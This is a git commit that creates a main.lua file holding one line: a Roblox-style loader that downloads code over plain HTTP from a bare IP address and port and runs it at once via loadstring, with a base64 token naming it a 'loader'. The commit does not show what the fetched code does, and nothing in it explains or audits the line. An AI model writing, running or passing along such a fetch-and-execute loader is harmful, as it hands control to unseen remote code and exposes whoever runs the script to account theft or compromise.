8356f2657de8b6549da7533ca1efe56c0dc635cc
OverDrive <breno.y2k@gmail.com>
2026-02-01 13:27:33 -0300

    Create main.lua

---
+++ main.lua
@@ -0,0 +1,1 @@
+loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6IjkwNGU5NTg3LTQ0ZDAtNGQ1YS04MmFiLTJhYzlmZWFjZjVhZSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
